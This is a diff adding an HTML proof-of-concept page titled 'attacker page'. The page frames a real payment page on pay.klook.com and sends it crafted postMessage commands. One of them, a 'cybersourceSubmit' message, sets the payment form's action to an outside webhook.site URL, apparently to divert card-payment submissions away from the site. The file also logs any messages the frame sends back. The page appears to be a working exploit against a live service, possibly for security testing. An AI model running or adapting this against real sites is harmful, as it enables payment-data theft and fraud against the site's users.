@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>frame test</title></head>
+<body>
+<h1>attacker page</h1>
+<iframe id="f" src="https://pay.klook.com/index.html" width="600" height="700"></iframe>
+<pre id="log"></pre>
+<script>
+const log=(m)=>{document.getElementById('log').textContent += m+"\n"; window._msgs=window._msgs||[]; window._msgs.push(m);};
+window.addEventListener('message', e=>{ log('MSG from '+e.origin+' :: '+JSON.stringify(e.data)); });
+document.getElementById('f').addEventListener('load', ()=>{ log('iframe loaded'); setTimeout(()=>{
+  document.getElementById('f').contentWindow.postMessage({type:'init',props:{paymentType:'credit',themeColor:'#ff5722',resEnLang:'en'}}, '*');
+  log('sent init');
+  setTimeout(()=>{
+    document.getElementById('f').contentWindow.postMessage({type:'cybersourceSubmit',props:{cybersourcePayFromData:{action:'https://webhook.site/<TOKEN>',data:{access_key:'AK',profile_id:'PF',merchant_id:'MID',transaction_uuid:'TU',signed_field_names:'a,b',unsigned_field_names:'c',signed_date_time:'2026-11-07T00:00:00Z',locale:'en',transaction_type:'sale',reference_number:'REF1',amount:'1.00',currency:'USD',payment_method:'card',bill_to_forename:'T',bill_to_surname:'U',bill_to_email:'t@example.com',merchant_defined_data5:'web'}}}}, '*');
+    log('sent cybersourceSubmit');
+  }, 1500);
+}, 1000); });
+</script>
+</body></html>
